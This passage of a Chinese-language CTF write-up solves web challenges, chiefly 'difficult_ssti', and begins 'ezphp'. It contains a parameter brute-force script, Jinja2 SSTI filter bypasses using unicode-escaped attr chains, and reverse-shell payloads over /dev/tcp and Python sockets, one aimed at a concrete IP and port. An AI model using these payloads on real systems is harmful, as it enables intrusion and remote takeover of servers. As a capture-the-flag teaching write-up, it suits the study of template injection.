<p>操作与上述类似，得到payload之后，更改<code>Upgrade-Insecure-Requests</code>为这句反弹shell的代码，在发包前，监听起相应服务器的相应端口，然后发包即可成功反弹shell：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/62668908239250f7c5955d72.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668908239250f7c5955d72.png"></a></p>
<p>需要注意的是，本题的解绝非仅有这两种方法，提出这两种方法本质是想要达到抛砖引玉的目的，大家可以再思考一下，有没有更简单的方法。比如本题中使用的是apache，且访问日志<strong>并未</strong>开启，但是假如开启的话，那么我们是否可以在headers中直接写入一句话木马，然后通过include将apache的访问日志access.log包含进来，从而达到getshell的目的呢？答案是可以的，但是这些需要大家自己去验证。</p>
<h2 id="difficult-ssti"><a href="#difficult-ssti" class="headerlink" title="difficult_ssti"></a>difficult_ssti</h2><p><strong>题目考察内容</strong>：参数爆破+SSTI+eval函数反弹shell</p>
<h3 id="获取线索-2"><a href="#获取线索-2" class="headerlink" title="获取线索"></a>获取线索</h3><p>打开环境，提示“告诉你一个秘密，这个网站有个snert路由，快去看看吧”。进入&#x2F;snert，又提示我们传入一个POST型参数：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/62668972239250f7c5964911.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668972239250f7c5964911.png"></a></p>
<p>但是传入的参数名却并未告诉我们。尝试爆破目录与抓包，也并没有任何有用的线索。那么现在唯一的线索就是找到这个参数的参数名，爆破这个参数有很多种方法，可以利用burp，脚本，或者工具arjun来爆破参数（arjun项目地址<a target="_blank" rel="noopener" href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a>)：</p>
<p>脚本很好写，随便贴一个吧：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node1.snert.cn/snert&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_param</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;your_dict&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            line = line.strip()</span><br><span class="line">            data = &#123;line:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">            req = requests.post(url,data=data)</span><br><span class="line">            time.sleep(<span class="number">0.05</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;一眼顶针，鉴定为假&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;参数为：&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(line))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    get_param()</span><br></pre></td></tr></table></figure>

<p>脚本中打开的文件是我们的字典文件，网上有很多，这里就不放了。拿到参数名为url，接着我们尝试传递url参数为不同的值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当url=1时，提示`一眼顶针，鉴定为真，这是你的url吗： 1`。我们可以发现这里会将我们输入的url参数输出出来。那我们让url=&#123;&#123;1+1&#125;&#125;，提示如下：</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/62668986239250f7c5967974.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668986239250f7c5967974.png"></a></p>
<p>我们fuzz一下发现这里大概过滤了这些：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%1c&#x27;, &#x27;%1d&#x27;, &#x27;%1f&#x27;, &#x27;%1e&#x27;, &#x27;%20&#x27;, &#x27;%2b&#x27;, &#x27;%2c&#x27;, &#x27;%3c&#x27;, &#x27;%3e,&#x27;.&#x27;, &#x27;[&#x27;, &#x27;]&#x27;, &#x27;&#123;&#123;&#x27;, &#x27;=&#x27;, &#x27;_&#x27;, &#x27;&#x27;&#x27;, &#x27;&quot;&quot;&#x27;, &#x27;\x&#x27;, &#x27;request&#x27;, &#x27;config&#x27;, &#x27;session&#x27;, &#x27;url_for&#x27;, &#x27;g&#x27;,&#x27;get_flashed_messages&#x27;, &#x27;*&#x27;, &#x27;for&#x27;, &#x27;if&#x27;, &#x27;format&#x27;, &#x27;list&#x27;, &#x27;lower&#x27;, &#x27;slice&#x27;,&#x27;striptags&#x27;, &#x27;trim&#x27;,&#x27;xmlattr&#x27;, &#x27;tojson&#x27;, &#x27;set&#x27;, &#x27;=&#x27;, &#x27;chr&#x27;</span><br><span class="line"></span><br><span class="line">其中&#123;&#123;和&quot;&quot;连续就被过滤。关于“&#123;&#123;”，我们可以利用“&#123;%%&#125;”来绕过，在&#123;% %&#125;里面可以执行python命令，只要不报错就可以。比如让`url=&#123;%print(123)%&#125;`，回显如下：</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/62668993239250f7c5969f68.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668993239250f7c5969f68.png"></a></p>
<p>现在就可以肯定，这里存在SSTI漏洞。利用方式与一般的SSTI是一样的思路，但是需要写在print中进行执行，也就是<code>&#123;%print(我们构造的python链)%&#125;</code>，同时我们还要注意绕过过滤。</p>
<h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><p>这里将”.”进行了过滤，我们可以利用的绕过方式：<code>|attr(&quot;__class__&quot;)</code>。这里注意一下，其中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;__builtins__&#x27;]</span><br><span class="line">应当是</span><br><span class="line">|attr(&quot;get&quot;)(&quot;__builtins__&quot;)</span><br><span class="line">而不仅仅是|attr(&quot;__builtins__&quot;)</span><br><span class="line">[&quot;eval&quot;]同理</span><br></pre></td></tr></table></figure>

<p>接下来还有个问题，下划线该怎么绕过呢？这也是这道题中最难的地方。首先我们不能利用16进制进行绕过了，因为过滤\x，但是相同的思路，我们可不可以利用Unicode编码来绕过呢？比如，我们将__class__换一下这样构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print(&#123;&#125;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;))%&#125;</span><br></pre></td></tr></table></figure>

<p>回显如下：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/626689a2239250f7c596c157.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626689a2239250f7c596c157.png"></a></p>
<p>成功注入。那接下来的思路就很简单了，按照我们一般SSTI注入方式进行注入，同时利用|attr(“<strong>unicode编码</strong>“)进行绕过即可。通过报错，我们可以发现，环境使用的是python3.10：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/626689b8239250f7c596f51f.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626689b8239250f7c596f51f.png"></a></p>
<p>我们利用python3的注入方式就可以了。在这里，我利用<code>__builtins__</code> 模块来进行执行命令。利用下面的代码可以在自己的python3环境中看看哪些子类中具有<code>__builtins__</code> 模块：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;&#125;.__class__.__base__.__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(i.__init__.__globals__.keys())</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            <span class="built_in">print</span>(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>可以利用<code>__builtins__</code>模块中的open函数，先查看一下启动当前进程的完整命令：</p>
<p>可以构造出如下python链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print(((((((((&#123;&#125;|attr(&quot;__class__&quot;))|attr(&quot;__base__&quot;))|attr(&quot;__subclasses__&quot;))()|attr(80))|attr(&quot;__init__&quot;))|attr(&quot;__globals__&quot;))|attr(&quot;get&quot;)(&quot;builtins&quot;))|attr(&quot;get&quot;)(&quot;open&quot;)(&quot;/proc/self/cmdline&quot;))|attr(read))()%&#125;</span><br></pre></td></tr></table></figure>

<p>url编码后，得到payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print(((((((((&#123;&#125;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;))()|attr(80))|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u006f\u0070\u0065\u006e&quot;)(&quot;\u002f\u0070\u0072\u006f\u0063\u002f\u0073\u0065\u006c\u0066\u002f\u0063\u006d\u0064\u006c\u0069\u006e\u0065&quot;))|attr(&quot;\u0072\u0065\u0061\u0064&quot;))()%&#125;</span><br></pre></td></tr></table></figure>

<p>传入参数，回显如下：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/62669e80239250f7c5cd0f61.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62669e80239250f7c5cd0f61.png"></a></p>
<p>接着查看app.py，查看&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;app.py文件即可，步骤与上述类似，拿到网站源码：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/62669ec2239250f7c5ce15e1.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62669ec2239250f7c5ce15e1.png"></a></p>
<p>我们发现这里竟然还过滤了flag，popen，system这几个字符串的unicode编码。通过源码发现网站打开了debug模式，于是进入&#x2F;console目录，想着拿到Pin码，获取控制台权限。（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/HacTF/p/8160076.html">Flask debug 模式 PIN 码生成机制安全性研究笔记</a>）但是查看&#x2F;etc&#x2F;passwd文件发现，服务器没有运行flask所登录的用户名，因为尝试将用户名设为root得到的Pin码并不正确，且服务器也没有其他可以使用的用户名，因此这个办法也行不通。</p>
<h3 id="SSTI-eval函数反弹shell"><a href="#SSTI-eval函数反弹shell" class="headerlink" title="SSTI+eval函数反弹shell"></a>SSTI+eval函数反弹shell</h3><p>既然过滤了popen、system和flag的unicode编码，那就意味着我们无法通过open函数查看到flag，也无法使用popen和system这两个函数进行命令执行。那么还有没有别的方法可以反弹shell呢？当然有的。</p>
<p>这是popen和system函数利用的python反弹shell的代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your_ip&quot;,your_listening_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这段代码需要放到<code>os.system</code>或者<code>os.popen</code>中执行才成功，因为前面有<code>python3 -c</code> 这个字符串，这个字符串的意思是在终端中使用python3进行了一次命令执行，其中-c的含义为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-c cmd : program passed in as string (terminates option list)</span><br></pre></td></tr></table></figure>

<p>popen和system都是直接的命令执行函数，类似于直接在终端执行命令。但是eval函数并不是这样，eval函数返回传入字符串的表达式的结果。就是说：将字符串当成有效的表达式 来求值 并 返回计算结果。</p>
<p>我们将上面那句python反弹shell的代码进行如下尝试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> socket, subprocess, os</span><br><span class="line"></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&quot;your_ip&quot;</span>, your_port))</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">    p = subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>

<p>发现执行成功：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/626689ca239250f7c5971e78.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626689ca239250f7c5971e78.png"></a></p>
<p>那我们再用eval函数试试？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">eval</span>(</span><br><span class="line">        <span class="string">&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;110.42.234.56\&quot;,9200));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/bash\&quot;,\&quot;-i\&quot;]);&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>执行后报错：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/626689f2239250f7c59779c9.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626689f2239250f7c59779c9.png"></a></p>
<p>我们可以发现是定位到import时报错，由此怀疑，不能使用import，寻找替换方案为<code>__import__</code>。在使用<code>__import__</code> 前，我们要先知道<a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/102748166">python3中import和__import__的区别</a>。其中__import__ 不会绑定变量 这意味代码中的每个变量 都要用__import__ 来代替使用。知道这个之后，我们就可以编写出如下代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">eval</span>(</span><br><span class="line">        <span class="string">&quot;__import__(&#x27;subprocess&#x27;).call(\&quot;echo &#x27;sh -i &gt;&amp; /dev/tcp/your_ip/your_listening_port 0&gt;&amp;1&#x27;&gt;x &amp;&amp; bash x &amp;&amp; rm -rf x\&quot;,shell=True)&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>在测试机上执行，攻击机上监听相应端口，执行成功：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/62668a31239250f7c59810fb.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668a31239250f7c59810fb.png"></a></p>
<p>那接下来我们就正式将SSTI与eval函数反弹shell相结合，上面得到的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print((((((((&#123;&#125;|attr(&quot;__class__&quot;))|attr(&quot;__base__&quot;))|attr(&quot;__subclasses__&quot;))()|attr(80))|attr(&quot;__init__&quot;))|attr(&quot;__globals__&quot;))|attr(&quot;get&quot;)(&quot;builtins&quot;))|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;))%&#125;</span><br></pre></td></tr></table></figure>

<p>那我们就将其中的命令执行相关的代码给替换成我们上面的eval函数中的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print((((((((&#123;&#125;|attr(&quot;__class__&quot;))|attr(&quot;__base__&quot;))|attr(&quot;__subclasses__&quot;))()|attr(80))|attr(&quot;__init__&quot;))|attr(&quot;__globals__&quot;))|attr(&quot;get&quot;)(&quot;builtins&quot;))|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;subprocess&#x27;).call(&quot;echo &#x27;sh -i &gt;&amp; /dev/tcp/your_ip/your_listening_port 0&gt;&amp;1&#x27;&gt;x &amp;&amp; bash x &amp;&amp; rm -rf x&quot;,shell=True)&quot;))%&#125;</span><br></pre></td></tr></table></figure>

<p>再统一对上面双引号内的字符串进行unicode编码，payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print((((((((&#123;&#125;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;))()|attr(80))|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u0073\u0075\u0062\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u0027\u0029\u002e\u0063\u0061\u006c\u006c\u0028\u0022\u0065\u0063\u0068\u006f\u0020\u0027\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0031\u0031\u0030\u002e\u0034\u0032\u002e\u0032\u0033\u0034\u002e\u0035\u0036\u002f\u0039\u0032\u0030\u0030\u0020\u0030\u003e\u0026\u0031\u0027\u003e\u0078\u0020\u0026\u0026\u0020\u0062\u0061\u0073\u0068\u0020\u0078\u0020\u0026\u0026\u0020\u0072\u006d\u0020\u002d\u0072\u0066\u0020\u0078\u0022\u002c\u0073\u0068\u0065\u006c\u006c\u003d\u0054\u0072\u0075\u0065\u0029&quot;))%&#125;</span><br></pre></td></tr></table></figure>

<p>攻击机上监听相应端口后，在网页中发送这个url参数，就可以成功反弹shell了：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/62668a2a239250f7c597ffe1.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668a2a239250f7c597ffe1.png"></a></p>
<p>在这里再科普一些有关于反弹shell的知识：通过以上方法反弹shell获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。我们只需在获取的shell里面输入如下命令，即可模拟一个终端设备：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/62668a54239250f7c5985d4c.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668a54239250f7c5985d4c.png"></a></p>
<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>打开环境，网站直接给出源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听某个大黑阔说flag在/flag里</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Snert</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a != <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b))) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\)|\(|\&#x27;|\&quot;|\&lt;\?php|post|get/&quot;</span>, <span class="variable">$this</span>-&gt;a, <span class="variable">$match</span>))&#123;</span><br><span class="line">                   <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">die</span>(<span class="string">&quot;Get out,Hacker!!!!!&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;snert_is_good&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;snert_is_good&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这道题目考察的是选手对PHP的原生类在CTF中的利用，我们可以利用以下方法遍历PHP的内置类：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span>    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这道题目中使用的是<code>Error/Exception</code> 内置类。<code>Error</code>类是php的一个内置类，用于自动自定义一个Error，使用于php7版本。<code>Exception</code> 适用于php5、7版本 ，是所有用户级异常的基类。</p>
<h3 id="Error类："><a href="#Error类：" class="headerlink" title="Error类："></a>Error类：</h3><p>类摘要：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Error implements Throwable &#123;</span><br><span class="line">    /* 属性 */</span><br><span class="line">    protected string $message ;</span><br><span class="line">    protected int $code ;</span><br><span class="line">    protected string $file ;</span><br><span class="line">    protected int $line ;</span><br><span class="line">    /* 方法 */</span><br><span class="line">    public __construct ( string $message = &quot;&quot; , int $code = 0 , Throwable $previous = null )</span><br><span class="line">    final public getMessage ( ) : string</span><br><span class="line">    final public getPrevious ( ) : Throwable</span><br><span class="line">    final public getCode ( ) : mixed</span><br><span class="line">    final public getFile ( ) : string</span><br><span class="line">    final public getLine ( ) : int</span><br><span class="line">    final public getTrace ( ) : array</span><br><span class="line">    final public getTraceAsString ( ) : string</span><br><span class="line">    public __toString ( ) : string</span><br><span class="line">  